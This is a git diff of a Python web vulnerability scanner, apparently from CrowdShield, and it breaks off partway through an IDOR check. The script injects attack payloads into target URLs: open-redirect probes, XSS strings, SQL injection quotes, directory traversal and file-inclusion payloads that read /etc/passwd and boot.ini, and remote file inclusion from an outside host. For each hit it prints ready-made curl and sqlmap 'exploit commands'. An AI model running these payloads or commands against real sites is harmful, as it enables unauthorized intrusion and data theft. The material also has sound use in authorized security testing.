@@ -1,7 +1,7 @@
 #!/usr/bin/python
 
 from __future__ import print_function
-import urllib, urllib2, sys, urlparse, os, ssl
+import urllib, urllib2, sys, urlparse, os, optparse
 
 OKBLUE='\033[94m'
 OKRED='\033[91m'
@@ -11,6 +11,7 @@ COLOR1='\033[95m'
 COLOR2='\033[96m'
 COLOR3='\033[90m'
 RESET='\x1b[0m'
+VERBOSE='1'
 
 def logo():
     print(OKORANGE + '      ____        _           __ _  __' + RESET)
@@ -24,96 +25,119 @@ def logo():
     print(OKBLUE +   '   --== https://crowdshield.com ==-- ' + RESET)
     print('')
 
-
 def active_scan():
 
     # PUT EVERYTHING BACK TOGETHER
     new_url = base_url
 
-
-    # Open Redirect ######################################################################################
-    #redirect_exploit = "hTtP://tests.arachni-scanner.com/rfi.md5.txt"
-    redirect_exploit = urllib.quote_plus('hTtP://tests.arachni-scanner.com/rfi.md5.txt')
-    # print COLOR2 + "[i] Trying Payload: " + str(redirect_exploit) + RESET
-    redirect_url = new_url.replace("INJECTX", redirect_exploit)
-    http_request = urllib.urlopen(redirect_url)
-    http_response = http_request.read()
-    http_length = len(http_response)
-    http_status = http_request.getcode()
-    http_length_diff = str(http_length_base - http_length)
-    print(COLOR2 + "[i] New URL: " + redirect_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
-
-    if "705cd559b16e6946826207c2199bd890" in http_response:
-        print(OKRED + "[+] Open Redirect Found! " + RESET)
-        print(OKRED + "[+] Vulnerable URL: " + redirect_url + RESET)
-        print(OKGREEN + "[c] Exploit Command: curl -s -I -L '" + redirect_url + "' | egrep location --color=auto")
-    else:
-        print(COLOR1 + "[F] Open Redirect Failed." + RESET)
-
-
     # Open Redirect 2 ######################################################################################
-    redirect_exploit = "crowdshield.com"
-    # print COLOR2 + "[i] Trying Payload: " + str(redirect_exploit) + RESET
+    redirect_exploit = "32lp3si8w5pc.runscope.net"
+
+    #if (verbose == "y"):
+        #print(COLOR2 + "[i] Trying Payload: " + str(redirect_exploit) + RESET)
+
     redirect_url = new_url.replace("INJECTX", redirect_exploit)
     http_request = urllib.urlopen(redirect_url)
     http_response = http_request.read()
+    #print(http_response)
     http_length = len(http_response)
     http_status = http_request.getcode()
     http_length_diff = str(http_length_base - http_length)
-    print(COLOR2 + "[i] New URL: " + redirect_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
 
-    if "www.crowdshield.com" in http_response:
+    if (verbose == "y"):
+        print(COLOR2 + "[i] New URL: " + redirect_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
+
+    if "runscope_host" in http_response or "error_code" in http_response:
         print(OKRED + "[+] Open Redirect Found! " + RESET)
         print(OKRED + "[+] Vulnerable URL: " + redirect_url + RESET)
         print(OKGREEN + "[c] Exploit Command: curl -s -I '" + redirect_url + "' | egrep location --color=auto")
-    else:
-        print(COLOR1 + "[F] Open Redirect Failed." + RESET)
+    #else:
+        #print(COLOR1 + "[F] Open Redirect Failed." + RESET)
 
 
     # Open Redirect 3 ######################################################################################
-    redirect_exploit = urllib.quote_plus("//crowdshield.com")
-    # print COLOR2 + "[i] Trying Payload: " + str(redirect_exploit) + RESET
+    redirect_exploit = urllib.quote_plus("//32lp3si8w5pc.runscope.net")
+    
+    #if (verbose == "y"):
+        #print(COLOR2 + "[i] Trying Payload: " + str(redirect_exploit) + RESET)
+
     redirect_url = new_url.replace("INJECTX", redirect_exploit)
     http_request = urllib.urlopen(redirect_url)
     http_response = http_request.read()
+    #print(http_response)
     http_length = len(http_response)
     http_status = http_request.getcode()
     http_length_diff = str(http_length_base - http_length)
-    print(COLOR2 + "[i] New URL: " + redirect_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
+    
+    if (verbose == "y"):
+        print(COLOR2 + "[i] New URL: " + redirect_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
+    #os.system("firefox " + redirect_url + "&")
 
-    if "www.crowdshield.com" in http_response:
+    if "runscope_host" in http_response or "error_code" in http_response:
         print(OKRED + "[+] Open Redirect Found! " + RESET)
         print(OKRED + "[+] Vulnerable URL: " + redirect_url + RESET)
         print(OKGREEN + "[c] Exploit Command: curl -s -I '" + redirect_url + "' | egrep location --color=auto")
-    else:
-        print(COLOR1 + "[F] Open Redirect Failed." + RESET)
+    #else:
+        #print(COLOR1 + "[F] Open Redirect Failed." + RESET)
+
+
+    # Open Redirect 4 ######################################################################################
+    redirect_exploit = "https://32lp3si8w5pc.runscope.net"
+    #if (verbose == "y"):
+        #print(COLOR2 + "[i] Trying Payload: " + str(redirect_exploit) + RESET)
+
+    redirect_url = new_url.replace("INJECTX", redirect_exploit)
+    http_request = urllib.urlopen(redirect_url)
+    http_response = http_request.read()
+    #print(http_response)
+    http_length = len(http_response)
+    http_status = http_request.getcode()
+    http_length_diff = str(http_length_base - http_length)
+    
+    if (verbose == "y"):
+        print(COLOR2 + "[i] New URL: " + redirect_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
+    #os.system("firefox " + redirect_url + "&")
+
+    if "runscope_host" in http_response or "error_code" in http_response:
+        print(OKRED + "[+] Open Redirect Found! " + RESET)
+        print(OKRED + "[+] Vulnerable URL: " + redirect_url + RESET)
+        print(OKGREEN + "[c] Exploit Command: curl -s -I '" + redirect_url + "' | egrep location --color=auto")
+    #else:
+        #print(COLOR1 + "[F] Open Redirect Failed." + RESET)
 
 
     # XSS ######################################################################################
     try:
-        # print COLOR2 + "[i] Trying Payload: " + str(payload) + RESET
+        #if (verbose == "y"):
+            #print(COLOR2 + "[i] Trying Payload: " + str(payload) + RESET)
+
         http_request = urllib2.urlopen(new_url)
         http_response = http_request.read()
         http_length = len(http_response)
         http_status = http_request.getcode()
         http_length_diff = str(http_length_base - http_length)
-        print(COLOR2 + "[i] New URL: " + new_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
+        if (verbose == "y"):
+            print(COLOR2 + "[i] New URL: " + new_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
 
         # CHECK FOR REFLECTED VALUE
         if payload in http_response:
             print(OKGREEN + "[+] Reflected Value Detected! " + RESET)
+            print(COLOR2 + "[i] New URL: " + new_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
 
             # IF REFLECTED, TRY HEURISTIC STRING
             payload_exploit_unencoded = '"></INJECTX>(1)'
             payload_exploit = urllib.quote_plus('"></INJECTX>(1)')
             xss_url = new_url.replace("INJECTX", payload_exploit)
-            # print COLOR2 + "[i] Trying Payload: " + str(payload_exploit) + RESET
+            #if (verbose == "y"):
+                #print(COLOR2 + "[i] Trying Payload: " + str(payload_exploit) + RESET)
+
             http_request = urllib2.urlopen(xss_url)
             http_response = http_request.read()
             http_length = len(http_response)
             http_length_diff = str(http_length_base - http_length)
             http_status = http_request.getcode()
-            print(COLOR2 + "[i] New URL: " + xss_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
+            if (verbose == "y"):
+                print(COLOR2 + "[i] New URL: " + xss_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
 
             # CONTINUE TO XSS EXPLOITATION
             if payload_exploit_unencoded in http_response:
@@ -124,11 +148,11 @@ def active_scan():
                 print(OKGREEN + "[c] Exploit Command: firefox '" + xss_url2 + "' & ")
                 #os.system("curl -s '" + xss_url2 + "' | egrep alert\(1\) --color=auto")
                 #os.system("firefox '" + xss_url2 + "' > /dev/null 2> /dev/null")
-            else:
-                print(COLOR1 + "[F] XSS Exploit Failed." + RESET)
+            #else:
+                #print(COLOR1 + "[F] XSS Exploit Failed." + RESET)
 
-        else:
-            print(COLOR1 + "[F] No Reflected Values Found. " + RESET)
+        #else:
+            #print(COLOR1 + "[F] No Reflected Values Found. " + RESET)
     except:
         pass
 
@@ -136,14 +160,17 @@ def active_scan():
     # SQLi ######################################################################################
     try:
         sqli_exploit = urllib.quote_plus("'")
-        # print COLOR2 + "[i] Trying Payload: " + str(sqli_exploit) + RESET
+        #if (verbose == "y"):
+            #print(COLOR2 + "[i] Trying Payload: " + str(sqli_exploit) + RESET)
+
         sqli_url = new_url.replace("INJECTX", sqli_exploit)
         http_request = urllib.urlopen(sqli_url)
         http_response = http_request.read()
         http_length = len(http_response)
         http_length_diff = str(http_length_base - http_length)
         http_status = http_request.getcode()
-        print(COLOR2 + "[i] New URL: " + sqli_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
+        if (verbose == "y"):
+            print(COLOR2 + "[i] New URL: " + sqli_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
 
         if "SQL" in http_response or http_status == 500 or http_status == 503:
             print(OKRED + "[+] SQL Injection Found! " + RESET)
@@ -151,118 +178,185 @@ def active_scan():
             sqlmap_command = 'sqlmap --batch --dbs -u "' + full_url + '"'
             print(OKGREEN + "[c] Exploit Command: " + sqlmap_command)
             #os.system(sqlmap_command)
-        else:
-            print(COLOR1 + "[F] SQL Injection Failed." + RESET)
+        #else:
+            #print(COLOR1 + "[F] SQL Injection Failed." + RESET)
     except:
         pass
 
+
+
+    # SQLi 2 ######################################################################################
+    try:
+        sqli_exploit = urllib.quote_plus("\\")
+        #if (verbose == "y"):
+            #print(COLOR2 + "[i] Trying Payload: " + str(sqli_exploit) + RESET)
+
+        sqli_url = new_url.replace("INJECTX", sqli_exploit)
+        http_request = urllib.urlopen(sqli_url)
+        http_response = http_request.read()
+        http_length = len(http_response)
+        http_length_diff = str(http_length_base - http_length)
+        http_status = http_request.getcode()
+        if (verbose == "y"):
+            print(COLOR2 + "[i] New URL: " + sqli_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
+
+        if "SQL" in http_response or http_status == 500 or http_status == 503:
+            print(OKRED + "[+] SQL Injection Found! " + RESET)
+            print(OKRED + "[+] Vulnerable URL: " + sqli_url + RESET)
+            sqlmap_command = 'sqlmap --batch --dbs -u "' + full_url + '"'
+            print(OKGREEN + "[c] Exploit Command: " + sqlmap_command)
+            #os.system(sqlmap_command)
+        #else:
+            #print(COLOR1 + "[F] SQL Injection Failed." + RESET)
+    except:
+        pass
 
 
 
     # Windows Directory Traversal ######################################################################################
     try:
-        traversal_exploit = urllib.quote_plus('..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\\boot.ini')
-        # print COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + RESET
+        traversal_exploit = urllib.quote_plus('/..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\\boot.ini')
+        #if (verbose == "y"):
+            #print(COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + RESET)
+
         traversal_url = new_url.replace("INJECTX", traversal_exploit)
         http_request = urllib.urlopen(traversal_url)
         http_response = http_request.read()
         http_length = len(http_response)
         http_length_diff = str(http_length_base - http_length)
         http_status = http_request.getcode()
-        print(COLOR2 + "[i] New URL: " + traversal_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
+        if (verbose == "y"):
+            print(COLOR2 + "[i] New URL: " + traversal_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
 
-        if "boot loader" in http_response:
+        if "boot loader" in http_response or "16-bit" in http_response:
             print(OKRED + "[+] Windows Directory Traversal Found! " + RESET)
             print(OKRED + "[+] Vulnerable URL: " + traversal_url + RESET)
             print(OKGREEN + "[c] Exploit Command: curl -s '" + traversal_url + "' | egrep Windows --color=auto")
-        else:
-            print(COLOR1 + "[F] Windows Directory Traversal Failed." + RESET)
+        #else:
+            #print(COLOR1 + "[F] Windows Directory Traversal Failed." + RESET)
     except:
         pass
 
     # Windows Directory Traversal 2 ######################################################################################
     try:
-        traversal_exploit = urllib.quote_plus('..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\\boot.ini%00')
-        # print COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + RESET
+        traversal_exploit = urllib.quote_plus('/..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\\boot.ini%00')
+        #if (verbose == "y"):
+            #print(COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + RESET)
+
         traversal_url = new_url.replace("INJECTX", traversal_exploit)
         http_request = urllib.urlopen(traversal_url)
         http_response = http_request.read()
         http_length = len(http_response)
         http_length_diff = str(http_length_base - http_length)
         http_status = http_request.getcode()
-        print(COLOR2 + "[i] New URL: " + traversal_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
+        if (verbose == "y"):
+            print(COLOR2 + "[i] New URL: " + traversal_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
 
-        if "boot loader" in http_response:
+        if "boot loader" in http_response or "16-bit" in http_response:
             print(OKRED + "[+] Windows Directory Traversal Found! " + RESET)
             print(OKRED + "[+] Vulnerable URL: " + traversal_url + RESET)
             print(OKGREEN + "[c] Exploit Command: curl -s '" + traversal_url + "' | egrep Windows --color=auto")
-        else:
-            print(COLOR1 + "[F] Windows Directory Traversal + NULL Byte Failed." + RESET)
+        #else:
+            #print(COLOR1 + "[F] Windows Directory Traversal + NULL Byte Failed." + RESET)
     except:
         pass
 
-    # Linux Directory Traversal ######################################################################################
+
+    # Windows Directory Traversal 3 ######################################################################################
     try:
-        traversal_exploit = urllib.quote_plus("../../../../../../../../../../../../../../../../../etc/passwd")
-        # print COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + RESET
+        traversal_exploit = '..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00test.htm'
+        #if (verbose == "y"):
+            #print(COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + RESET)
+
         traversal_url = new_url.replace("INJECTX", traversal_exploit)
         http_request = urllib.urlopen(traversal_url)
         http_response = http_request.read()
         http_length = len(http_response)
         http_length_diff = str(http_length_base - http_length)
         http_status = http_request.getcode()
-        print(COLOR2 + "[i] New URL: " + traversal_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
+        if (verbose == "y"):
+            print(COLOR2 + "[i] New URL: " + traversal_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
+
+        if "boot loader" in http_response or "16-bit" in http_response or "16-bit" in http_response:
+            print(OKRED + "[+] Windows Directory Traversal Found! " + RESET)
+            print(OKRED + "[+] Vulnerable URL: " + traversal_url + RESET)
+            print(OKGREEN + "[c] Exploit Command: curl -s '" + traversal_url + "' | egrep Windows --color=auto")
+        #else:
+            #print(COLOR1 + "[F] Windows Directory Traversal + NULL Byte Failed." + RESET)
+    except:
+        pass
+
+
+    # Linux Directory Traversal ######################################################################################
+    try:
+        traversal_exploit = urllib.quote_plus("/../../../../../../../../../../../../../../../../../etc/passwd")
+        #if (verbose == "y"):
+            #print(COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + RESET)
+
+        traversal_url = new_url.replace("INJECTX", traversal_exploit)
+        http_request = urllib.urlopen(traversal_url)
+        http_response = http_request.read()
+        http_length = len(http_response)
+        http_length_diff = str(http_length_base - http_length)
+        http_status = http_request.getcode()
+        if (verbose == "y"):
+            print(COLOR2 + "[i] New URL: " + traversal_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
 
         if "root:" in http_response:
             print(OKRED + "[+] Linux Directory Traversal Found! " + RESET)
             print(OKRED + "[+] Vulnerable URL: " + traversal_url + RESET)
             print(OKGREEN + "[c] Exploit Command: curl -s '" + traversal_url + "' | egrep root --color=auto")
-        else:
-            print(COLOR1 + "[F] Linux Directory Traversal Failed." + RESET)
+        #else:
+            #print(COLOR1 + "[F] Linux Directory Traversal Failed." + RESET)
     except:
         pass
 
     # Linux Directory Traversal 2 ######################################################################################
     try:
-        traversal_exploit = urllib.quote_plus("../../../../../../../../../../../../../../../../../etc/passwd%00")
-        # print COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + RESET
+        traversal_exploit = urllib.quote_plus("/../../../../../../../../../../../../../../../../../etc/passwd%00")
+        #if (verbose == "y"):
+            #print(COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + RESET)
+
         traversal_url = new_url.replace("INJECTX", traversal_exploit)
         http_request = urllib.urlopen(traversal_url)
         http_response = http_request.read()
         http_length = len(http_response)
         http_length_diff = str(http_length_base - http_length)
         http_status = http_request.getcode()
-        print(COLOR2 + "[i] New URL: " + traversal_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
+        if (verbose == "y"):
+            print(COLOR2 + "[i] New URL: " + traversal_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
 
         if "root:" in http_response:
             print(OKRED + "[+] Linux Directory Traversal Found! " + RESET)
             print(OKRED + "[+] Vulnerable URL: " + traversal_url + RESET)
             print(OKGREEN + "[c] Exploit Command: curl -s '" + traversal_url + "' | egrep root --color=auto")
-        else:
-            print(COLOR1 + "[F] Linux Directory Traversal + NULL Byte Failed." + RESET)
+        #else:
+            #print(COLOR1 + "[F] Linux Directory Traversal + NULL Byte Failed." + RESET)
     except:
         pass
-
 
 
     # LFI Check ######################################################################################
     try:
         rfi_exploit = urllib.quote_plus("/etc/passwd")
-        # print COLOR2 + "[i] Trying Payload: " + str(rfi_exploit) + RESET
+        #if (verbose == "y"):
+            #print(COLOR2 + "[i] Trying Payload: " + str(rfi_exploit) + RESET)
+
         rfi_url = new_url.replace("INJECTX", rfi_exploit)
         http_request = urllib.urlopen(rfi_url)
         http_response = http_request.read()
         http_length = len(http_response)
         http_length_diff = str(http_length_base - http_length)
         http_status = http_request.getcode()
-        print(COLOR2 + "[i] New URL: " + rfi_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
+        if (verbose == "y"):
+            print(COLOR2 + "[i] New URL: " + rfi_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
 
         if "root:" in http_response:
             print(OKRED + "[+] Linux Local File Inclusion Found! " + RESET)
             print(OKRED + "[+] Vulnerable URL: " + rfi_url + RESET)
             print(OKGREEN + "[c] Exploit Command: curl -s '" + rfi_url + "' | egrep 'root:' --color=auto")
-        else:
-            print(COLOR1 + "[F] Linux Local File Inclusion Failed." + RESET)
+        #else:
+            #print(COLOR1 + "[F] Linux Local File Inclusion Failed." + RESET)
     except:
         pass
 
@@ -270,21 +364,24 @@ def active_scan():
     # LFI Check 2 ######################################################################################
     try:
         rfi_exploit = urllib.quote_plus("/etc/passwd%00")
-        # print COLOR2 + "[i] Trying Payload: " + str(rfi_exploit) + RESET
+        #if (verbose == "y"):
+            #print (COLOR2 + "[i] Trying Payload: " + str(rfi_exploit) + RESET)
+
         rfi_url = new_url.replace("INJECTX", rfi_exploit)
         http_request = urllib.urlopen(rfi_url)
         http_response = http_request.read()
         http_length = len(http_response)
         http_length_diff = str(http_length_base - http_length)
         http_status = http_request.getcode()
-        print(COLOR2 + "[i] New URL: " + rfi_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
+        if (verbose == "y"):
+            print(COLOR2 + "[i] New URL: " + rfi_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
 
         if "root:" in http_response:
             print(OKRED + "[+] Linux Local File Inclusion Found! " + RESET)
             print(OKRED + "[+] Vulnerable URL: " + rfi_url + RESET)
             print(OKGREEN + "[c] Exploit Command: curl -s '" + rfi_url + "' | egrep 'root:' --color=auto")
-        else:
-            print(COLOR1 + "[F] Linux Local File Inclusion + NULL Byte Failed." + RESET)
+        #else:
+            #print(COLOR1 + "[F] Linux Local File Inclusion + NULL Byte Failed." + RESET)
     except:
         pass
 
@@ -292,21 +389,24 @@ def active_scan():
     # LFI Check 3 ######################################################################################
     try:
         rfi_exploit = urllib.quote_plus("C:\\boot.ini")
-        # print COLOR2 + "[i] Trying Payload: " + str(rfi_exploit) + RESET
+        #if (verbose == "y"):
+            #print(COLOR2 + "[i] Trying Payload: " + str(rfi_exploit) + RESET)
+
         rfi_url = new_url.replace("INJECTX", rfi_exploit)
         http_request = urllib.urlopen(rfi_url)
         http_response = http_request.read()
         http_length = len(http_response)
         http_length_diff = str(http_length_base - http_length)
         http_status = http_request.getcode()
-        print(COLOR2 + "[i] New URL: " + rfi_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
+        if (verbose == "y"):
+            print(COLOR2 + "[i] New URL: " + rfi_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
 
-        if "boot loader" in http_response:
+        if "boot loader" in http_response or "16-bit" in http_response:
             print(OKRED + "[+] Windows Local File Inclusion Found! " + RESET)
             print(OKRED + "[+] Vulnerable URL: " + rfi_url + RESET)
             print(OKGREEN + "[c] Exploit Command: curl -s '" + rfi_url + "' | egrep 'root:' --color=auto")
-        else:
-            print(COLOR1 + "[F] Windows Local File Inclusion." + RESET)
+        #else:
+            #print(COLOR1 + "[F] Windows Local File Inclusion." + RESET)
     except:
         pass
 
@@ -314,21 +414,24 @@ def active_scan():
     # LFI Check 4 ######################################################################################
     try:
         rfi_exploit = urllib.quote_plus("C:\\boot.ini%00")
-        # print COLOR2 + "[i] Trying Payload: " + str(rfi_exploit) + RESET
+        #if (verbose == "y"):
+            #print(COLOR2 + "[i] Trying Payload: " + str(rfi_exploit) + RESET)
+
         rfi_url = new_url.replace("INJECTX", rfi_exploit)
         http_request = urllib.urlopen(rfi_url)
         http_response = http_request.read()
         http_length = len(http_response)
         http_length_diff = str(http_length_base - http_length)
         http_status = http_request.getcode()
-        print(COLOR2 + "[i] New URL: " + rfi_url + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
+        if (verbose == "y"):
+            print(COLOR2 + "[i] New URL: " + rfi_url + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
 
-        if "boot loader" in http_response:
+        if "boot loader" in http_response or "16-bit" in http_response:
             print(OKRED + "[+] Local File Inclusion Found! " + RESET)
             print(OKRED + "[+] Vulnerable URL: " + rfi_url + RESET)
             print(OKGREEN + "[c] Exploit Command: curl -s '" + rfi_url + "' | egrep 'root:' --color=auto")
-        else:
-            print(COLOR1 + "[F] Windows Local File Inclusion + NULL Byte Failed." + RESET)
+        #else:
+            #print(COLOR1 + "[F] Windows Local File Inclusion + NULL Byte Failed." + RESET)
     except:
         pass
 
@@ -336,21 +439,24 @@ def active_scan():
     # RFI Check ######################################################################################
     try:
         rfi_exploit = urllib.quote_plus("hTtP://tests.arachni-scanner.com/rfi.md5.txt")
-        # print COLOR2 + "[i] Trying Payload: " + str(rfi_exploit) + RESET
+        #if (verbose == "y"):
+            #print(COLOR2 + "[i] Trying Payload: " + str(rfi_exploit) + RESET)
+
         rfi_url = new_url.replace("INJECTX", rfi_exploit)
         http_request = urllib.urlopen(rfi_url)
         http_response = http_request.read()
         http_length = len(http_response)
         http_length_diff = str(http_length_base - http_length)
         http_status = http_request.getcode()
-        print(COLOR2 + "[i] New URL: " + rfi_url + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
+        if (verbose == "y"):
+            print(COLOR2 + "[i] New URL: " + rfi_url + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
 
         if "705cd559b16e6946826207c2199bd890" in http_response:
             print(OKRED + "[+] Remote File Inclusion Found! " + RESET)
             print(OKRED + "[+] Vulnerable URL: " + rfi_url + RESET)
             print(OKGREEN + "[c] Exploit Command: curl -s '" + rfi_url + "' | egrep 705cd559b16e6946826207c2199bd890 --color=auto")
-        else:
-            print(COLOR1 + "[F] Remote File Inclusion Failed." + RESET)
+        #else:
+            #print(COLOR1 + "[F] Remote File Inclusion Failed." + RESET)
     except:
         pass
 
@@ -358,49 +464,52 @@ def active_scan():
     # RFI Check 2 ######################################################################################
     try:
         rfi_exploit = urllib.quote_plus("hTtP://tests.arachni-scanner.com/rfi.md5.txt%00")
-        # print COLOR2 + "[i] Trying Payload: " + str(rfi_exploit) + RESET
+        #if (verbose == "y"):
+            #print(COLOR2 + "[i] Trying Payload: " + str(rfi_exploit) + RESET)
+
         rfi_url = new_url.replace("INJECTX", rfi_exploit)
         http_request = urllib.urlopen(rfi_url)
         http_response = http_request.read()
         http_length = len(http_response)
         http_length_diff = str(http_length_base - http_length)
         http_status = http_request.getcode()
-        print(COLOR2 + "[i] New URL: " + rfi_url + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
+        if (verbose == "y"):
+            print(COLOR2 + "[i] New URL: " + rfi_url + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
 
         if "705cd559b16e6946826207c2199bd890" in http_response:
             print(OKRED + "[+] Remote File Inclusion Found! " + RESET)
             print(OKRED + "[+] Vulnerable URL: " + rfi_url + RESET)
             print(OKGREEN + "[c] Exploit Command: curl -s '" + rfi_url + "' | egrep 705cd559b16e6946826207c2199bd890 --color=auto")
-        else:
-            print(COLOR1 + "[F] Remote File Inclusion + NULL Byte Failed." + RESET)
+        #else:
+            #print(COLOR1 + "[F] Remote File Inclusion + NULL Byte Failed." + RESET)
     except:
         pass
 
 
     # IDOR Check ######################################################################################
-    idor_list = [1,2,3]
-    idor_length_list = []
-    for idor in idor_list:
-        try:
-            idor_exploit = str(idor)
-            # print COLOR2 + "[i] Trying Payload: " + str(idor) + RESET
-            idor_url = new_url.replace("INJECTX", idor_exploit)
-            http_request = urllib.urlopen(idor_url)
-            http_response = http_request.read()
-            http_length = len(http_response)
-            http_status = http_request.getcode()
-            idor_length_list.append(http_length)
-            http_length_diff = str(http_length_base - http_length)
-            print(COLOR2 + "[i] New URL: " + idor_url + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
-
